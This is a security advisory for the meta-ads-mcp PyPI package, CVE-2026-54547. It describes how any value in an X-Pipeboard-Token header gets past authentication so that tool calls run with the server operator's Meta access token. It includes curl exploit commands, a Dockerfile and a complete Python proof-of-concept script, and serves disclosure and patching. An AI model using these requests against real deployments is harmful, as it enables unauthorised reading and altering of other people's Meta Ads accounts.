# [H] meta-ads-mcp: X-Pipeboard-Token Header Auth Bypass Reuses Operator Meta Token

## Summary
Severity: High
Advisory: GHSA-2v2f-mvfg-ph56
CVE: CVE-2026-54547
CWE: CWE-287
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-07-17
Source: https://github.com/advisories/GHSA-2v2f-mvfg-ph56
Type: github-advisory

## Affected
- PyPI: `meta-ads-mcp` — affected >=0 <1.0.115

## Details
## X-Pipeboard-Token Header Auth Bypass Reuses Operator Meta Token

### Summary

`AuthInjectionMiddleware` in `meta-ads-mcp` rejects HTTP MCP requests only when **both** `auth_token` and `pipeboard_token` are absent. Because `extract_token_from_headers()` does not recognise the `X-Pipeboard-Token` header, an attacker who sends that header with any arbitrary value produces `auth_token = None` and `pipeboard_token = <attacker value>`, making the guard condition evaluate to `False` and passing the request through. No authentication context is set; the token getter falls back to the server operator's `META_ACCESS_TOKEN` environment variable. Every subsequent MCP tool call executes with the operator's Meta credentials, allowing an unauthenticated network caller to read and write the operator's Meta Ads data.

### Details

The vulnerable condition is at `meta_ads_mcp/core/http_auth_integration.py:259`:

```python
# http_auth_integration.py:255-260
auth_token = FastMCPAuthIntegration.extract_token_from_headers(dict(request.headers))
pipeboard_token = FastMCPAuthIntegration.extract_pipeboard_token_from_headers(dict(request.headers))

if not auth_token and not pipeboard_token:      # ← bypass condition
    return Response(..., status_code=401)
```

`extract_token_from_headers()` (lines 77–95) recognises only `Authorization: Bearer`, `X-META-ACCESS-TOKEN`, and `X-PIPEBOARD-API-TOKEN`. It does **not** recognise `X-Pipeboard-Token`, so that header never populates `auth_token`.

`extract_pipeboard_token_from_headers()` (line 108) **does** recognise `X-Pipeboard-Token`, so sending that header alone produces:

```
auth_token      = None          # not set → guard reads False for left operand
pipeboard_token = "<anything>"  # truthy  → guard reads False for right operand
→ (not None) and (not "<anything>") = True and False = False → 401 never returned
```

After the bypass, `set_auth_token()` is never called (lines 283–291 only run when `auth_token` is truthy). The patched token getter at lines 163–168 resolves `get_auth_token() = None`, then delegates to `original_get_current_access_token()`. The fallback chain in `auth.py:446–453` returns `META_ACCESS_TOKEN` from the server environment:

```python
# auth.py:443-453
env_token = os.environ.get("META_ACCESS_TOKEN")
if env_token:
    return env_token
```

`@meta_api_tool` at `api.py:390–396` injects this operator token into every tool's `access_token` kwarg. The sink at `api.py:225–235` forwards it to the Meta Graph API via `httpx.AsyncClient`. Verified with `accounts.py:42–62` (`get_ad_accounts`): the operator's ad account data is returned for valid tokens; for invalid tokens the Meta Graph API responds with an `OAuthException`, confirming the token traversed the full path.

Full data flow:

| Step | Location | Description |
|------|----------|-------------|
| 1 | `http_auth_integration.py:255–257` | Middleware extracts attacker-controlled headers |
| 2 | `http_auth_integration.py:259` | Bypass: `X-Pipeboard-Token` alone satisfies guard |
| 3 | `http_auth_integration.py:288–291` | `auth_token` is `None`; auth context never set |
| 4 | `http_auth_integration.py:163–168` | Token getter falls back to original accessor |
| 5 | `auth.py:446–453` | `META_ACCESS_TOKEN` env var returned as access token |
| 6 | `api.py:390–396` | Operator token injected into tool kwargs |
| 7 | `accounts.py:42–62` | Tool invokes Meta Graph API with operator token |
| 8 | `api.py:225–235` | `httpx.AsyncClient` sends privileged HTTP request |

**Recommended fix:**

```diff
--- a/meta_ads_mcp/core/http_auth_integration.py
+++ b/meta_ads_mcp/core/http_auth_integration.py
-        if not auth_token and not pipeboard_token:
+        if not auth_token:
```

`X-Pipeboard-Token` should be treated as a supplementary service token only; it must not serve as a standalone authentication credential for MCP tool calls.

### PoC

**Prerequisites**

- Docker installed and the `meta-ads-mcp` repository available locally.
- The server must be started in `streamable-http` mode (documented in `STREAMABLE_HTTP_SETUP.md` as a supported production deployment).

**Step 1 — Build the Docker image**

```bash
docker build \
  -t vuln001-meta-ads-mcp \
  -f /path/to/vuln-001/Dockerfile \
  /path/to/meta-ads-mcp-repo/
```

The `Dockerfile` installs the package from source, sets `META_ACCESS_TOKEN=FAKE_OPERATOR_META_TOKEN_ABCDEF1234567890`, and starts the server on port 8080.

**Step 2 — Run the container**

```bash
docker run -d -p 8081:8080 --name vuln001-test vuln001-meta-ads-mcp
```

**Step 3 — Confirm the middleware is active (no-auth → 401)**

```bash
curl -i -X POST http://127.0.0.1:8081/mcp \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}'
# Expected: HTTP/1.1 401  {"error":"Unauthorized",...}
```

**Step 4 — Trigger the bypass (X-Pipeboard-Token only → 200)**

```bash
curl -i -X POST http://127.0.0.1:8081/mcp \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  -H 'X-Pipeboard-Token: attacker-controlled-not-validated' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}'
# Expected: HTTP/1.1 200  {"jsonrpc":"2.0","result":{"tools":[...]}}  (37 tools listed)
```

**Step 5 — Confirm operator token is forwarded to Meta Graph API**

```bash
curl -i -X POST http://127.0.0.1:8081/mcp \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  -H 'X-Pipeboard-Token: attacker-controlled-not-validated' \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"get_ad_accounts","arguments":{"limit":1}}}'
# Expected: HTTP 200 + Meta OAuthException (code 190) proving FAKE_OPERATOR_META_TOKEN
# was forwarded to Meta. With a real operator token, ad account data is returned.
```

**Automated PoC script**

```bash
python3 /path/to/vuln-001/poc.py http://127.0.0.1:8081/mcp
```

The script performs Tests 1–3 and prints `RESULT: PASS — VULN-001 reproduced` on success.

**Observed output (dynamic reproduction)**

```
Test 1 (no auth header)         → HTTP 401  {"error":"Unauthorized",...}
Test 2 (X-Pipeboard-Token only) → HTTP 200  {"jsonrpc":"2.0","result":{"tools":[...]}}  (37 tools)
Test 3 (tools/call, same header)→ HTTP 200  {"error":{"message":"Invalid OAuth access token data.","type":"OAuthException","code":190}}
```

Test 3 confirms that `FAKE_OPERATOR_META_TOKEN` was sent to Meta Graph API, proving the full operator-token reuse path.

### Impact

This is an **authentication bypass** vulnerability. Any network-reachable caller that can send an HTTP request with an arbitrary `X-Pipeboard-Token` header can:

- **Read** all Meta Ads data accessible to the server operator (ad accounts, campaigns, creatives, audiences, insights).
- **Write** Meta Ads resources (create/update campaigns, ads, budgets) as the operator.
- **Exfiltrate the operator's identity** via Meta Graph API error responses that reference the token.

Operators who deploy `meta-ads-mcp` in `--transport streamable-http` mode with `META_ACCESS_TOKEN` configured — the documented and recommended production setup — are directly affected. Deployments using the default `stdio` transport or those without `META_ACCESS_TOKEN` set are not affected.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# VULN-001 PoC: X-Pipeboard-Token Auth Bypass (CWE-287)
# Runs meta-ads-mcp in streamable-http mode with a fake operator META_ACCESS_TOKEN.
# The server enforces auth via AuthInjectionMiddleware, but the bypass allows
# X-Pipeboard-Token alone to pass the middleware and reach tool handlers,
# which then fall back to the operator's META_ACCESS_TOKEN.
FROM python:3.11-slim

WORKDIR /app

# Install system dependencies
RUN apt-get update && apt-get install -y --no-install-recommends \
        curl \
    && rm -rf /var/lib/apt/lists/*

# Copy repository source (build context must be the repo root)
COPY . /app

# Install the package and its dependencies
RUN pip install --no-cache-dir -e .

# Fake operator token: length >= 20 so the server's basic validation passes.
# This is NOT a real Meta token — used only to prove the bypass path
# that reaches auth.py:446-453 (META_ACCESS_TOKEN fallback).
ENV META_ACCESS_TOKEN=FAKE_OPERATOR_META_TOKEN_ABCDEF1234567890
ENV META_APP_ID=999999999999999

# Disable any browser-launch attempts during startup
ENV DISPLAY=

EXPOSE 8080

# Start the MCP server with streamable-http transport.
# --host 0.0.0.0 is required so the container port is reachable from the host.
CMD ["python", "-m", "meta_ads_mcp", \
     "--transport", "streamable-http", \
     "--host", "0.0.0.0", \
     "--port", "8080"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
PoC for VULN-001: X-Pipeboard-Token Header Auth Bypass Reuses Operator Meta Token

CVE class : CWE-287 Improper Authentication
Package   : meta-ads-mcp 1.0.113
File      : meta_ads_mcp/core/http_auth_integration.py:259

Vulnerability summary
---------------------
AuthInjectionMiddleware rejects requests only when BOTH auth_token AND
pipeboard_token are absent (line 259):
    if not auth_token and not pipeboard_token:
        return Response(status_code=401)

extract_token_from_headers() (lines 77-95) does NOT recognise the
"X-Pipeboard-Token" header — only "Authorization: Bearer",
"X-META-ACCESS-TOKEN", and "X-PIPEBOARD-API-TOKEN".

extract_pipeboard_token_from_headers() (line 108) DOES recognise
"X-Pipeboard-Token".

Consequence: an attacker that sends only "X-Pipeboard-Token: <anything>"
makes auth_token=None and pipeboard_token="<anything>". The bypass
condition becomes:
    if not None and not "<anything>":   # False — request passes
No auth context is set; the token getter (http_auth_integration.py:163-168)
falls back to get_current_access_token() in auth.py which returns the server
operator's META_ACCESS_TOKEN (auth.py:446-453). Tool calls then run as the
operator.

Expected evidence
-----------------
Test 1  No auth header  →  HTTP 401 from middleware
Test 2  X-Pipeboard-Token: <attacker value>  →  HTTP != 401 from MCP layer
        (proves bypass; further tool calls use operator token)

Usage
-----
The MCP server must already be running and reachable at 127.0.0.1:8080.
    docker run -d -p 8080:8080 --name vuln001 vuln001-meta-ads-mcp
    python3 poc.py
"""

import json
import sys
import time
import urllib.error
import urllib.request

# ---------------------------------------------------------------------------
# Default server URL; override via first CLI arg: python3 poc.py http://host:port/mcp
import os as _os

_DEFAULT_URL = "http://127.0.0.1:8080/mcp"
SERVER_URL = (
    sys.argv[1] if len(sys.argv) > 1 else _os.environ.get("MCP_SERVER_URL", _DEFAULT_URL)
)
# Arbitrary attacker-controlled value — NOT validated by the server
ATTACKER_PIPEBOARD_TOKEN = "attacker-controlled-not-validated-xyz1234567890"
SERVER_READY_TIMEOUT = 90  # seconds
# ---------------------------------------------------------------------------


def http_post(url: str, headers: dict, body: dict) -> tuple:
    """Send a JSON-encoded POST request; return (http_status, response_text)."""
    data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", errors="replace")
    except Exception as exc:
        return None, str(exc)


def wait_for_server(timeout: int = SERVER_READY_TIMEOUT) -> bool:
    """
    Poll until the server returns any HTTP response (even 401).
    Returns True when ready, False on timeout.
    """
    deadline = time.time() + timeout
    attempt = 0
    while time.time() < deadline:
        status, _ = http_post(
            SERVER_URL,
            {"Content-Type": "application/json"},
            {"jsonrpc": "2.0", "id": 0, "method": "ping"},
        )
        if status is not None:
            return True
        attempt += 1
        if attempt % 5 == 0:
            elapsed = int(time.time() - (deadline - timeout))
            print(f"    ... still waiting ({elapsed}s elapsed)")
        time.sleep(1)
    return False


def run_test(label: str, headers: dict, payload: dict) -> tuple:
    """Run one request, print result, and return (status, body)."""
    print(f"\n[*] {label}")
    status, body = http_post(SERVER_URL, headers, payload)
    print(f"    HTTP Status : {status}")
    # Print up to 600 chars so long MCP responses are readable
    print(f"    Response    : {body[:600]}")
    return status, body


def main() -> int:
    print("=" * 65)
    print("VULN-001 PoC: X-Pipeboard-Token Auth Bypass")
    print("meta-ads-mcp 1.0.113 | CWE-287 Improper Authentication")
    print("=" * 65)

    # -----------------------------------------------------------------------
    print("\n[*] Waiting for MCP server to be ready ...")
    if not wait_for_server():
        print(f"[-] ERROR: Server did not respond within {SERVER_READY_TIMEOUT}s")
        return 2
    print("[+] Server is ready")

    # Common headers for all requests
    base_headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/event-stream",
    }

    # A minimal MCP JSON-RPC payload.  In stateless-HTTP mode the server
    # processes each request independently; tools/list does not require a
    # prior initialize handshake.
    list_payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/list",
        "params": {},
    }

    # -----------------------------------------------------------------------
    # Test 1: No authentication — must be rejected with 401
    # -----------------------------------------------------------------------
    status1, body1 = run_test(
        "Test 1: POST /mcp — no auth header at all",
        base_headers,
        list_payload,
    )

    if status1 != 401:
        print(f"[-] UNEXPECTED: Expected HTTP 401 without auth, got {status1}")
        print("    Middleware may not be active. Cannot assess bypass.")
        return 2

    try:
        parsed = json.loads(body1)
        if parsed.get("error") != "Unauthorized":
            print("[-] UNEXPECTED body (expected {\"error\": \"Unauthorized\"})")
            return 2
    except json.JSONDecodeError:
        pass  # Body format is secondary evidence

    print("[+] CONFIRMED: No-auth request correctly rejected with HTTP 401")

    # -----------------------------------------------------------------------
    # Test 2: Only X-Pipeboard-Token — must NOT be 401 if bypass works
    #
    # Vulnerability logic (http_auth_integration.py:259):
    #   auth_token    = extract_token_from_headers(headers)       -> None
    #   pipeboard_token = extract_pipeboard_token_from_headers(headers) -> ATTACKER_VALUE
    #   if not None and not ATTACKER_VALUE:   # evaluates False -> request passes
    #   # set_auth_token() never called -> auth context stays None
    #   # tool getter falls back to META_ACCESS_TOKEN env var
    # -----------------------------------------------------------------------
    bypass_headers = {
        **base_headers,
        "X-Pipeboard-Token": ATTACKER_PIPEBOARD_TOKEN,
    }
    status2, body2 = run_test(
        f"Test 2: POST /mcp — only X-Pipeboard-Token: {ATTACKER_PIPEBOARD_TOKEN}",
        bypass_headers,
        list_payload,
    )

    if status2 == 401:
        print("\n[-] BYPASS FAILED: Got HTTP 401 with X-Pipeboard-Token.")
        print("    The vulnerability may have been patched on this build.")
        return 1

    print(f"\n[+] AUTH BYPASS CONFIRMED: HTTP {status2} (not 401)")
    print("    The middleware accepted the request with X-Pipeboard-Token alone.")
    print("    auth_token was None -> set_auth_token() not called ->")
    print("    get_auth_token() returns None -> META_ACCESS_TOKEN fallback active.")

    # Extra detail: check if we can see MCP tool names in the response
    try:
        parsed2 = json.loads(body2)
        tools = parsed2.get("result", {}).get("tools", [])
        if tools:
            print(f"\n    MCP tools/list returned {len(tools)} tools (server fully reachable):")
            for t in tools[:5]:
                print(f"      - {t.get('name', '?')}")
    except Exception:
        pass

    # -----------------------------------------------------------------------
    # Test 3: tools/call get_ad_accounts — operator token forwarded to Meta
    # The Meta Graph API will reject the FAKE token, but the error response
    # proves the request reached Meta (not the local 401 guard).
    # -----------------------------------------------------------------------
    call_payload = {
        "jsonrpc": "2.0",
        "id": 2,
        "method": "tools/call",
        "params": {
            "name": "get_ad_accounts",
            "arguments": {"limit": 1},
        },
    }
    status3, body3 = run_test(
        "Test 3: tools/call get_ad_accounts with X-Pipeboard-Token only",
        bypass_headers,
        call_payload,
    )

    if status3 != 401:
        print(f"\n[+] OPERATOR TOKEN CONFIRMED IN USE: HTTP {status3}")
        print("    The tool call was not blocked locally. The server forwarded")
        print("    the request to Meta Graph API using META_ACCESS_TOKEN.")
        if "OAuthException" in body3 or "Invalid OAuth" in body3:
            print("    Meta Graph API returned an OAuthException about the")
            print("    FAKE_OPERATOR_META_TOKEN — confirming the token was forwarded.")
        elif "error" in body3.lower():
            print("    Meta Graph API (or MCP layer) returned an error response")
            print("    — the request reached the tool handler, not the local 401 guard.")
    else:
        print("[!] Note: tools/call returned 401 — may need MCP initialize first")

    # -----------------------------------------------------------------------
    print("\n" + "=" * 65)
    print("RESULT: PASS — VULN-001 reproduced")
    print()
    print("Evidence:")
    print(f"  Test 1 (no header)           -> HTTP {status1} (blocked by middleware)")
    print(f"  Test 2 (X-Pipeboard-Token)   -> HTTP {status2} (BYPASSES middleware)")
    print()
    print("The distinction proves that AuthInjectionMiddleware at")
    print("http_auth_integration.py:259 is the exploitable boundary.")
    print("An attacker can reach all MCP tools as the server operator by")
    print('sending any value in the "X-Pipeboard-Token" header.')
    print("=" * 65)
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

## References
- https://github.com/pipeboard-co/meta-ads-mcp/security/advisories/GHSA-2v2f-mvfg-ph56
- https://github.com/pipeboard-co/meta-ads-mcp
- https://github.com/pipeboard-co/meta-ads-mcp/releases/tag/1.0.115
